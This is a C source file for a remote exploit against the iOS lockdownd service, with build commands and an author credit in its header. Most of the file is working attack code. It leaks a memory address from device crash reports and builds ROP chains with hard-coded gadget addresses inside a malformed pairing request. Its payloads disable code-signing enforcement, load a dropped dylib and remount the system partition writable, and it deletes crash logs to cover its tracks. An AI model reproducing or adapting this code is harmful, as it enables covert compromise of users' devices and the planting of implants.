/*
 * keybreak.c - lockdownd remote exploit
 *
 * Created by Massimo Chiodini on 07/08/2013
 * Copyright (C) HT srl 2013. All rights reserved
 *
 * gcc -arch i386 -w -g -o klock lockdown_exploit.c -w -I/Users/armored/Documents/AppDev/libimobiledevice/include -I/opt/local/include -L/opt/
 * local/lib -L/usr/local/lib -limobiledevice -lplist /usr/lib/libiconv.2.dylib ./crashreport ./uploadtools -larchive
 *
 * gcc -arch i386 -g -c -o crashreport crashreport.c -I/usr/local/opt/libarchive/include
 * gcc -arch i386 -g -c -o uploadtools uploadtools.c -I/opt/local/include -L/opt/local/lib -L/usr/local/lib
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <iconv.h>
#include <errno.h>
#include <sys/time.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/diagnostics_relay.h>

#include "include/lleak.h"

#include "include/services.h"
#include "include/bootpd.h"
#include "include/kpf.h"
#include "include/kpb.h"
#include "include/launchd.h"
#include "include/dml.h"

unsigned char *gJbRes[] = { res_com_apple_bootpd_plist,
                            res_dml,
                            res_kpb_dylib,
                            res_kpf_dylib,
                            res_launchd_conf,
                            res_Services_plist,
                            NULL };

unsigned char *gJbResName[] = { (unsigned char*)"com.apple.bootpd.plist",
                                (unsigned char*)"dml",
                                (unsigned char*)"kpb.dylib",
                                (unsigned char*)"kpf.dylib",
                                (unsigned char*)"launchd.conf",
                                (unsigned char*)"Services.plist",
                                NULL };

unsigned int gJbRes_len[7];

typedef struct _Jbresources{
  unsigned char **res_list;
  unsigned char **res_name;
  unsigned int  *res_len;
} Jbresources;

Jbresources gJBresources;

#define LABEL_BUFF_LEN 0x5000

#define TRY_TOLEAK 1
#define TRY_TOEXPL 2

#define ROP_PARAM_OFF 0x4000

extern int  getDeviceCrashReport(char* crashLogFile);
extern int  createRemoteFoldersAndTools(Jbresources *jbresources, char *iosfolder);
extern void jb_close_device(afc_client_t afc);

//buffer_txt -> stored in sp:
// on 4.1 3gs       = 0x00521000, 0x00409000, 0x00387000, 0x0040a000, 0x00486000,
//                    0x00404000, 0x000f3000, 0x0049d000, 0x003ab000, 0x0048b000,
//                    0x004a6000, 0x00847000, 0x0040f000
//
// on 4.1 3gs nojb  = 0x000ec000
//
// on 4.3.3 4g      = 0xf1000, 0x224000, 0x107b000, 0x13e000, 0x0107d000

int gLeak = 0;
int payload_base         = 0x004a6000;
int payload_ascii_offset = 0;           // 0x2020;
int rop1_ref             = 0;           // 0x4252302c; //0x0052302c + 0x42000000 'B' will be resetted

int rop2_adr             = 0x30562958;  // 0x30562958 -> pop {r0, r1, r2, r3, §pc}
                                        // 0x330a76d4 -> pop {r4, r7, lr}; bx r3

int stack_adr            = 0;           // 0x42523050; //0x00523050 + 0x42000000 'B' will be resetted

int gRegVal[256];
int gRegValHit[256];

#ifdef NODYLIB
#define _eprintf printf
#else
#define _eprintf __eprintf
#endif

void __eprintf(const char *  format, ...)
{
#ifdef NODYLIB
  va_list args;
  va_start(args,format);
  printf(format, args);
#endif
}

#pragma mark -
#pragma mark USB Mux stuff
#pragma mark -

int sendPayloadToLockdown(char *buffer, int length)
{
  idevice_t phone = NULL;
  idevice_connection_t connection = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  int data =  ((unsigned char)length << 24) |
  ((unsigned short)(length & 0xFF00) << 8) |
  ((length & 0xFF0000u) >> 8) |
  ((length & 0xFF000000) >> 24);
  
  uint32_t sent_bytes = 0;
  
  ret = idevice_new(&phone, NULL);
  
  ret = idevice_connect(phone, 0xf27e, &connection);
  
  idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
  idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);
  
  free(buffer);
  
  sent_bytes = 0;
  length = 0;
  buffer = 0;
  
  idevice_connection_receive_timeout(connection, (char*)&length, 4, &sent_bytes, 1500);
  
  data =  ((unsigned char)length << 24) |
  ((unsigned short)(length & 0xFF00) << 8) |
  ((length & 0xFF0000u) >> 8) |
  ((length & 0xFF000000) >> 24);
  
  if (data)
  {
    //sent_bytes = 0;
    buffer = malloc(data);
    idevice_connection_receive_timeout(connection, buffer, data, &sent_bytes, 15000);
    free(buffer);
  }
  
  idevice_disconnect(connection);
  
  if (sent_bytes == 0)
    return 1;
  
  return 0;
}

char getAsciiByte(char in)
{
  char retByte;
  int i;
  
  for (i=0x1a; i < 0x80; i+=0x10)
  {
    retByte = in + i*2;
    
    if (retByte < 0x80 && retByte > 0x00)
      break;
  }
  
  return i;
}

int sendPayloadToLockdownForSpray(char *buffer, int length)
{
  idevice_t phone = NULL;
  idevice_connection_t connection = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  int data =  ((unsigned char)length << 24) |
  ((unsigned short)(length & 0xFF00) << 8) |
  ((length & 0xFF0000u) >> 8) |
  ((length & 0xFF000000) >> 24);
  
  uint32_t sent_bytes = 0;
  
  ret = idevice_new(&phone, NULL);
  
  ret = idevice_connect(phone, 0xf27e, &connection);
  
  idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
  idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);
  
  
  return 0;
}

#pragma mark -
#pragma mark Start/Stop lckd services
#pragma mark -

void start_ios()
{
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  uint16_t port = 0;
  afc_client_t afc = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return;
  }
  
  ret = lockdownd_start_service(client, "com.apple.mdws", &port);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && port)
    ret = afc_client_new(phone, port, &afc);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  return;
}

void stop_ios()
{
  uint16_t port = 0;
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return ;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return ;
  }
  
  ret = lockdownd_start_service(client, "com.apple.mdwt", &port);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  exit(0);
  
  return;
}

void start_crashmover()
{
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  uint16_t port = 0;
  afc_client_t afc = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return ;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return ;
  }
  
  ret = lockdownd_start_service(client, "com.apple.crashreportmover", &port);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && port)
    ret = afc_client_new(phone, port, &afc);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  return;
}

void start_bootpd()
{
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  uint16_t port = 0;
  afc_client_t afc = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return ;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return ;
  }
  
  ret = lockdownd_start_service(client, "com.apple.bootps", &port);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && port)
    ret = afc_client_new(phone, port, &afc);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  exit(0);
  
  return;
}

void stop_bootpd()
{
  uint16_t port = 0;
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return ;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return ;
  }
  
  ret = lockdownd_start_service(client, "com.apple.bootpe", &port);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  exit(0);
  
  return;
}

afc_client_t kjb_open_device(char* name)
{
  idevice_t phone = NULL;
  lockdownd_client_t client = NULL;
  uint16_t port = 0;
  afc_client_t afc = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5000);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return NULL;
  
  do
  {
    ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
    sleep(1);
  } while (ret != LOCKDOWN_E_SUCCESS);
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
    idevice_free(phone);
    return NULL;
  }
  
  ret = lockdownd_start_service(client, name, &port);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && port)
    ret = afc_client_new(phone, port, &afc);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  if (ret != AFC_E_SUCCESS)
    return NULL;
  
  return afc;
}

#pragma mark -
#pragma mark Init/clean device
#pragma mark -

int kjb_check_file(char *path, int timeout)
{
  int retv = 1;
  uint64_t handle;
  
  afc_client_t afc = kjb_open_device("com.apple.afc");
  
  if (afc == NULL)
    return 0;
  
  while (retv != AFC_E_SUCCESS)
  {
    retv = afc_file_open(afc,
                         path,
                         AFC_FOPEN_RDONLY,
                         &handle);
    
    if (--timeout == 0)
    {
      break;
    }
    
    sleep(1);
  }
  
  afc_file_close(afc, handle);
  
  jb_close_device(afc);
  
  if (retv == AFC_E_SUCCESS)
    return 1;
  else
    return 0;
}

#define CRASHREPO_FOLDER "/"

void cleanUpCrashReportFolder()
{
  char **file_list = NULL;
  
  start_crashmover();
  
  afc_client_t afc = kjb_open_device("com.apple.crashreportcopymobile");
  
  if (afc == NULL)
    return;
  
  int retval = afc_read_directory(afc, CRASHREPO_FOLDER, &file_list);
  
  if ( retval == AFC_E_SUCCESS)
  {
    int i = 0;
    
    while (file_list[i] != NULL)
    {
      char fullpath[256];
      sprintf(fullpath, "%s/%s", CRASHREPO_FOLDER, file_list[i++]);
      
      afc_remove_path(afc, fullpath);
    }
  }
  
  afc_client_free(afc);
}

#pragma mark -
#pragma mark CrashLog analysis
#pragma mark -

char *openCrashDump(char *filename)
{
  struct stat info;
  int filelen, len = 0;
  char filepath[256];
  
  sprintf(filepath, "/tmp/%s", filename);
  
  int fd = open(filepath, O_RDONLY);
  
  if(fstat(fd, &info) == -1)
  {
    printf("Error on stat file");
    return NULL;
  }
  
  filelen = (int)info.st_size;
  
  char *buffer = (char*)malloc(filelen);
  char *ptr = buffer;
  
  while(len < filelen)
  {
    int rb = read(fd, ptr, filelen);
    len += rb;
    ptr += rb;
  }
  
  close(fd);
  
  return buffer;
}

int findRegValue(char regnum, char *buffer)
{
  int i, retval = 0, regval = 0x203A0072;
  short regs = regnum;
  
  regs = (regnum << 8) & 0x0000FF00;
  regval += regs;
  
  int len = strlen(buffer);
  
  for(i=0; i < len; i++)
  {
    int *cival = (int*)&buffer[i];
    if (*cival == regval)
    {
      sscanf(&buffer[i+4], "0x%x ", &retval);
      break;
    }
  }
  
  return retval;
}

char **getCrashReports()
{
  int i = 0, a = 0;
  static char **file_list = NULL;
  static char *file_list_out[256];
  
  memset(file_list_out, 0, 256);
  
  start_crashmover();
  
  afc_client_t afc = kjb_open_device("com.apple.crashreportcopymobile");
  
  if (afc == NULL)
    return file_list_out;
  
  int retval = afc_read_directory(afc, CRASHREPO_FOLDER, &file_list);
  
  if ( retval == AFC_E_SUCCESS)
  {
    while (file_list[i] != NULL)
    {
      if (strcmp(file_list[i], ".") && strcmp(file_list[i], "..") &&
          !strncmp(file_list[i], "lockdownd_", 10))
      {
        file_list_out[a++] = file_list[i];
        _eprintf("get crashreport %s.\n", file_list[i]);
        getDeviceCrashReport(file_list[i]);
      }
      
      i++;
    }
    
    return file_list_out;
  }
  
  return file_list_out;
}

void saveRegValue(int val)
{
  int i = 0;
  
  while(gRegVal[i] != -1)
  {
    if (gRegVal[i] == val)
    {
      gRegValHit[i]++;
      return;
    }
    i++;
  }
  
  gRegVal[i] = val;
  
  gRegValHit[i]++;
}

int getLeakedBaseAddress()
{
  int i = 0, regval = 0, regvalhit = 0;
  
  _eprintf("\ngetting reports files...\n");
  
  char **filename = getCrashReports();
  
  if (filename[i] == NULL)
    return 0;
  
  _eprintf("\nanalyzing...\n");
  
  while(filename[i] != NULL)
  {
    char *buff = openCrashDump(filename[i]);
    
    if (buff)
    {
      saveRegValue(findRegValue('1', buff));
      free(buff);
    }
    i++;
  }
  
  i = 0;
  
  _eprintf("\nCalculate candidate base address\n\n");
  
  while(gRegVal[i] != -1)
  {
    int a = 0;
    
    _eprintf(" base address hit [0x%.8x]: ", gRegVal[i]);
    
    for(a=0; a < gRegValHit[i];a++)
      _eprintf("+");
    
    _eprintf("\n");
    
    if (regvalhit < gRegValHit[i])
    {
      regval = gRegVal[i];
      regvalhit = gRegValHit[i];
    }
    i++;
  }
  
  return regval;
}

#pragma mark -
#pragma mark UTF conversion
#pragma mark -

int appendUTF8Word(int ucn, char *base)
{
  size_t inleft = 4;
  size_t outleft = 256;
  iconv_t cd;
  int _inptr = ucn;
  int *inptr = &_inptr;
  char _utf8Buff[256];
  char *utf8Buff = _utf8Buff;
  int len;
  
  if ((cd = iconv_open("UTF8", "UNICODELITTLE")) == (iconv_t)(-1))
  {
    _eprintf( "Cannot open converter\n");
    return 0;
  }
  
  int rc = iconv(cd, (char**)&inptr, &inleft, &utf8Buff, &outleft);
  
  if (rc == -1)
  {
    _eprintf("Error in converting characters\n");
    
    if(errno == E2BIG)
      _eprintf("errno == E2BIG\n");
    if(errno == EILSEQ)
      _eprintf("errno == EILSEQ\n");
    if(errno == EINVAL)
      _eprintf("errno == EINVAL\n");
    
    iconv_close(cd);
    return 0;
  }
  
  iconv_close(cd);
  
  len = 256-outleft;
  
  memcpy(base, _utf8Buff, len); // 0x330e74d4
  
  return len;
}

int appendUTF8String(char *instring, char *base)
{
  int _inptr;
  int len = 0;
  int pad = 0;
  int pad_rest = 0;
  
  pad_rest = strlen(instring)%sizeof(int);
  
  if (pad_rest)
    pad = 1;
  
  int padlen = sizeof(int)*((strlen(instring)/sizeof(int)) + pad);
  pad_rest = padlen - strlen(instring);
  
  char *_istring = (char*)malloc(padlen);
  memset(_istring, 0, padlen);
  memcpy(_istring, instring, strlen(instring));
  
  if (pad_rest > 1)
    _istring[strlen(instring)+1] = 0xF0;
  
  int *istring = (int*)_istring;
  
  do{
    _inptr = *istring++;
    int tmplen = appendUTF8Word(_inptr, base);
    base += tmplen;
    len  += tmplen;
  } while ((char*)istring < (_istring+padlen));
  
  return len;
}

#pragma mark -
#pragma mark ROP shellcodes
#pragma mark -

char *dlopenROPLabelBuffer()
{
  int i = 0;
  
  int len = 0;
  
  char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);
  
  for(i=0; i < LABEL_BUFF_LEN+12; i++)
    buffer[i] = 'N';
  
  int base = (int)buffer+payload_ascii_offset;
  
  // length of unicode label string = 8188 this is correct
  
  // /usr/libexec/oah/Shims = 0x2FE24580
  // dlopen = 0x32fd45c5
  // rpo3 = 0x330a76d8
  // length of unicode label string = 8184
  
  len = appendUTF8Word(0x330e74d4, (char*)base);
  
  base += len;
  
  len = appendUTF8Word(0x2fe24580, (char*)base);
  
  base += len;
  base += 6;  // space for r1,r2,r3
  
  len = appendUTF8Word(0x32fd45c5, (char*)base);
  
  // base += len;
  
  // len = appendUTF8Word(0x330a76d8, base);
  
  return buffer;
}

char *execvROPLabelBuffer()
{
  int i = 0;
  int len = 0;
  
  char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);
  
  for(i=0; i < LABEL_BUFF_LEN+12; i++)
    buffer[i] = 'N';
  
  /*
   char *argv[] = "/sbin/mount", "-v", "-t hfs", "-o rw", "/dev/disk0s1s1", 0};
   execv("/sbin/mount", argv)
   execv = 0x33022160;
   */
  
  char *base = buffer +  payload_ascii_offset;
  
  char *argv0 = "/sbin/mount";
  char *argv1 = "-v";
  char *argv2 = "-t hfs";
  char *argv3 = "-o rw";
  char *argv4 = "/dev/disk0s1s1";
  
  // offset devono essere ricalcolati tenendo conto che la stringa e'
  // convertita in UTF16
  int argv0_addr = payload_base + (payload_ascii_offset + ROP_PARAM_OFF)*2 - 12;
  int argv1_addr = argv0_addr + strlen(argv0) + 1 + sizeof(int);
  int argv2_addr = argv1_addr + strlen(argv1) + 1 + sizeof(int);
  int argv3_addr = argv2_addr + strlen(argv2) + 1 + sizeof(int);
  int argv4_addr = argv3_addr + strlen(argv3) + 1 + sizeof(int);
  int argv_addr  = argv3_addr + strlen(argv3) + 1 + sizeof(int);
  
  /*
   * r0: argv0        :
   * r1: argv         :
   * r2: 0x004e004e   :
   * r3: 0x33022160   : execv
   * pc: 0x330a76d8   : bx r3
   */
  
  len = appendUTF8Word(0x330e74d4, base);     base += len;
  len = appendUTF8Word(argv0_addr, base);     base += len;
  len = appendUTF8Word(argv_addr+0x18, base); base += len; base += 2; // space for r2
  
  len = appendUTF8Word(0x33022160, base); base += len;
  len = appendUTF8Word(0x330a76d8, base);
  
  base = buffer +  payload_ascii_offset + ROP_PARAM_OFF;
  
  len = appendUTF8String(argv0, base); base += (len + sizeof(int)/2);
  len = appendUTF8String(argv1, base); base += (len + sizeof(int)/2);
  len = appendUTF8String(argv2, base); base += (len + sizeof(int)/2);
  len = appendUTF8String(argv3, base); base += (len + sizeof(int)/2);
  len = appendUTF8String(argv4, base); base += (len + sizeof(int)/2);
  
  len = appendUTF8Word(argv0_addr, base);   base += len;
  len = appendUTF8Word(argv1_addr, base);   base += len;
  len = appendUTF8Word(argv2_addr+1, base); base += len;
  len = appendUTF8Word(argv3_addr+2, base); base += len;
  len = appendUTF8Word(argv4_addr+4, base); base += len;
  
  return buffer;
}

char *sysctlAndDlopenROPLabelBuffer()
{
  int i = 0;
  int len = 0;
  
  char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);
  
  for(i=0; i < LABEL_BUFF_LEN+12; i++)
    buffer[i] = 'N';
  
  char *base = buffer +  payload_ascii_offset;
  
  /*
   * sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
   * sysctlbyname("security.mac.proc_enforce",  &proc_enforce,  &size, NULL, 0); ;
   */
  
  char *name  = "security.mac.proc_enforce";
  char *dlybn = "/var/mobile/Media/kdi/dml";
  int param_off = LABEL_BUFF_LEN - 1024;
  
  // offset devono essere ricalcolati tenendo conto che la stringa e'
  // convertita in UTF16
  //int name_addr    = payload_base + (payload_ascii_offset + ROP_PARAM_OFF)*2 - 152;
  int name_addr    = payload_base + (param_off)*2 - 152;
  int dlybn_addr   = name_addr  + (strlen(name)  + 1 + sizeof(int)) + 2;
  int oldp_addr    = dlybn_addr + (strlen(dlybn) + 1 + sizeof(int)) + 2;
  int oldlenp_addr = oldp_addr + sizeof(int);//0x3440b080;// contiene 4 (in corefoundation) //
  
  _eprintf("%s: param address: name at [0x%.8x]\n", __func__, name_addr);
  
  /*
   * r0: name          :
   * r1: &proc_enforce :
   * r2: &size         :
   * r3: 0x00000000    :
   * pc: 0x32ffe9a8    : sysctlbyname
   * sp: 0x00000000    : 0
   
   30562958 e8bd800f pop {r0, r1, r2, r3, pc}
   
   0xAAAAAA : r0
   0xAAAAAA : r1
   0xAAAAAA : r2
   30562958 : r3
   330a76d4 : pc
   
   330a76d4 e8bd4090 pop {r4, r7, lr}
   330a76d8 e12fff13 bx  r3
   
   0xAAAAAA : r4
   0xAAAAAA : r7
   30562958 : lr
   
   0x330e74d4 : ldr sp, [r0, #40]
   0x330e74d8 : ldr r0, [r0, #36]
   0x330e74dc : bx  r0 =
   */
  
  len = appendUTF8Word(0x330e74d4, base); base += len;
  
  // 30562958 e8bd800f pop {r0, r1, r2, r3, pc}
  len = appendUTF8Word(0x43434343, base); base += len;     // r0
  len = appendUTF8Word(0x43434343, base); base += len;     // r1
  len = appendUTF8Word(0x43434343, base); base += len;     // r2
  len = appendUTF8Word(0x30562958, base); base += len;     // r3
  len = appendUTF8Word(0x330a76d4, base); base += len;     // pc -> 330a76d4 e8bd4090 pop {r4, r7, lr}
  
  // setta lr
  // 330a76d4 e8bd4090 pop {r4, r7, lr}
  len = appendUTF8Word(0xAAAAAAAA, base); base += len;    // r4
  len = appendUTF8Word(0xAAAAAAAA, base); base += len;    // r7
  len = appendUTF8Word(0x330e19b4, base); base += len;    // lr -> 330e19b4 e8bd800f pop {r0, r1, r2, r3, pc}
  
  // 330a76d8 e12fff13 bx  r3 -> pop {r0, r1, r2, r3, pc}
  
  // 30562958 e8bd800f pop {r0, r1, r2, r3, pc}
  len = appendUTF8Word(name_addr,  base); base += len;     // r0
  len = appendUTF8Word(oldp_addr,  base); base += len;     // r1
  len = appendUTF8Word(oldlenp_addr, base); base += len;   // r2
  len = appendUTF8Word(0x30e9a770, base); base += len;     // r3 => in iokit contiente 00000000
  len = appendUTF8Word(0x32ffe9a9, base); base += len;     // pc = 0x34759150 -> pop {r4, r5, r6, r7, pc}
  len = appendUTF8Word(0x00040004, base); base += len;     // newlen : al ritorno sara' poppato in r0
  
  // lr -> 0x330e19b4 e8bd800f pop {r0, r1, r2, r3, pc} riallinea lo stack
  len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r1
  len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r2
  len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r3
  len = appendUTF8Word(0x30562958,  base); base += len;    // pc
  
  // 30562958 e8bd800f pop {r0, r1, r2, r3, pc}
  len = appendUTF8Word(dlybn_addr, base); base += len;     // r0: dylib_path
  len = appendUTF8Word(0x02020202, base);  base += len;    // r1: rtl_now
  len = appendUTF8Word(0x43434343, base); base += len;     // r2: nop
  len = appendUTF8Word(0x44444444, base); base += len;     // r3: nop
  len = appendUTF8Word(0x32fd45c5, base); base += len;     // pc: 0x32fd45c5 -> dlopen
  
  // Params
  //base = buffer +  payload_ascii_offset + ROP_PARAM_OFF;
  base = buffer + param_off;
  
  len = appendUTF8String(name, base);
  base += (len + sizeof(int)/2);
  
  len = appendUTF8String(dlybn, base);
  base += (len + sizeof(int)/2);
  
  len = appendUTF8Word(0x40404040, base); // oldp
  base += len;
  
  len = appendUTF8Word(0x00000004, base); // oldplen
  
  return buffer;
}

#pragma mark -
#pragma mark Entry point shellcode creation
#pragma mark -

char *setupBogusPairRequestDictionary()
{
  static char buffer_req[256];
  
  /*
   Bogus dictionary struct:
   R5->  0x17d070:   0x3e80383c      0x0100078c      0x3f3f3031      0x62613f3f
   0x17d080:   0x66656463      0x6c696867      0x0052302c(a)   0x41414141
   0x17d090:   0x41414141      0x30562958(e)   0x00523050(b)   0x41414141
   0x17d0a0:   0x41414141      0x41414141      0x00004141      0x00000000
   
   Bogus Label string:
   payload_base =    0x521000:   0x3e80383c      0x01000790  0x00001ffc  0x003f003f
   0x521010:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
   ....
   0x52302c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
   0x52303c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
   0x52304c:(d)0x330e74d4   (c)0x003f003f  0x003f003f  0x003f003f
   0x52305c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
   
   
   dictionary bug:
   
   344BCD80 LDR R3, [R5,#0x18] ; // R5 -> bogus dictionary (NSString) R3 = (a)
   ...
   344BCD8C LDR R3, [R3,#0x20]  ; // R3 = *((a) + 0x20) = *(0x0052302c+0x20) = 0x330e74d4
   344BCD90 LDR R8, [R1,R6,LSL#2]
   344BCD94 MOV R1, R2
   344BCD98 BLX R3 ; BLX 0x330e74d4
   ...
   rop1_address:
   330e74d4 e590d028 ldr sp, [r0, #40] ; sp = *(r0=0x17d070 + 40) = (b) = 0x00523050 -> (c)
   330e74d8 e5900024 ldr r0, [r0, #36] ; r0 = *(r0=0x17d070 + 36) = (e) = 0x30562958
   330e74dc e12fff10 bx r0
   ...
   
   rop2_address
   30562958 e8bd800f pop {r0, r1, r2, r3, pc}
   
   rpo3_address:
   330a76d8 e12fff13 bx r3
   */
  
  sprintf(buffer_req,
          "0????abcdefghil"
          "XXXX"                /*(a)*/
          "AAAAAAAA"
          "YYYY"                /*(e)*/
          "ZZZZ"                /*(b)*/
          "AAAAAAAAAAAAAA");
  
  // memcpy(buffer_req + 15, &rop1_ref, 4);                  // (a)
  // memcpy(buffer_req + 15 + 4 + 8, &rop2_adr, 4);          // (e)
  // memcpy(buffer_req + 15 + 4 + 8 + 4, &stack_adr, 4);     // (b)
  
  return buffer_req;
}

#pragma mark -
#pragma mark Xml Mux dictionary
#pragma mark -

char *createLockdownPlist(uint32_t *length)
{
  plist_t dict = plist_new_dict();
  
  plist_dict_insert_item(dict, "Request", plist_new_string("Pair"));
  plist_dict_insert_item(dict, "PairRecord", plist_new_string(setupBogusPairRequestDictionary()));
  plist_dict_insert_item(dict, "Label", plist_new_string(sysctlAndDlopenROPLabelBuffer()));
  
  char *buffer_xml = NULL;
  uint32_t length_xml = 0;
  
  plist_to_xml(dict, &buffer_xml, &length_xml);
  
  plist_free(dict);
  
  *length = length_xml;
  
  return buffer_xml;
}

#pragma mark -
#pragma mark Bytes adjusting
#pragma mark -

void adjustHiByteAddress(char *buffer)
{
  buffer += 246;
  
  memcpy(buffer + 15, &rop1_ref, 4);
  memcpy(buffer + 15 + 4 + 8, &rop2_adr, 4);
  memcpy(buffer + 15 + 4 + 8 + 4, &stack_adr, 4);
  buffer[18]    = 0x0;
  buffer[18+16] = 0x0;
}

void adjustHiByteAddressForLeak(char *buffer)
{
  buffer += 246;
  
  memcpy(buffer + 15, &rop1_ref, 4);
  memcpy(buffer + 15 + 4 + 8, &rop2_adr, 4);
  memcpy(buffer + 15 + 4 + 8 + 4, &stack_adr, 4);
  
  buffer[18+16] = 0x0;
}

void adjustRopAddr()
{
  char hiByte = (payload_base & 0x0000FF00) >> 8;
  char loByte = (payload_base & 0x000000FF);
  
  int p_utf_off_hi = getAsciiByte(hiByte);
  int p_utf_off_lo = getAsciiByte(loByte);
  
  payload_ascii_offset = (p_utf_off_hi << 8) | (p_utf_off_lo);
  
  rop1_ref    = payload_base + payload_ascii_offset*2 + 0xC - 0x20 + 0x43000000;
  stack_adr   = payload_base + payload_ascii_offset*2 + 0xC + 0x04 + 0x43000000;
}

void adjustRopAddrForLeak()
{
  char hiByte = (payload_base & 0x0000FF00) >> 8;
  char loByte = (payload_base & 0x000000FF);
  
  int p_utf_off_hi = getAsciiByte(hiByte);
  int p_utf_off_lo = getAsciiByte(loByte);
  
  payload_ascii_offset = (p_utf_off_hi << 8) | (p_utf_off_lo);
  
  // |32984710:3298470b | allfw/UIKit | 0x32236a7d
  rop1_ref    = 0x32236a7d - 0x20;
  stack_adr   = payload_base + payload_ascii_offset*2 + 0xC + 0x04 + 0x43000000;
}

#pragma mark -
#pragma mark Exploting
#pragma mark -

int exploiting(int flag)
{
  char *buffer_xml = NULL;
  uint32_t length_xml = 0;
  
  if (flag == TRY_TOEXPL)
  {
    _eprintf("creating PairRecord...\n");
    adjustRopAddr();
  }
  else
  {
    _eprintf("creating PairRecord for leaking out payload_base...\n");
    adjustRopAddrForLeak();
  }
  
  buffer_xml = createLockdownPlist(&length_xml);
  
  _eprintf("adjusting addresses...\n");
  
  sleep(1);
  
  // no for find leak...
  if  (flag == TRY_TOEXPL)
    adjustHiByteAddress(buffer_xml);
  else
    adjustHiByteAddressForLeak(buffer_xml);
  
  _eprintf("trying on addresses:\n\t payload at \t[0x%.8x]\n\t gadget1 at \t[0x%.4x]\n\t gadget2 at \t[0x%.8x]\n\t"
           " rop stack at \t[0x%.8x]\n\t ascii offset \t[0x%.8x]\n",
           payload_base, rop1_ref & 0xFFFFFFFF, rop2_adr, stack_adr & 0x00FFFFFF, payload_ascii_offset);
  
  _eprintf("sending exploit...\n");
  sleep(1);
  
  int retVal = sendPayloadToLockdown(buffer_xml, length_xml);
  
  if (retVal == 1)
    _eprintf("Exploting done.\n");
  else
    _eprintf("Exploting failed.\n");
  
  return 0;
}

#pragma mark -
#pragma mark Entry points
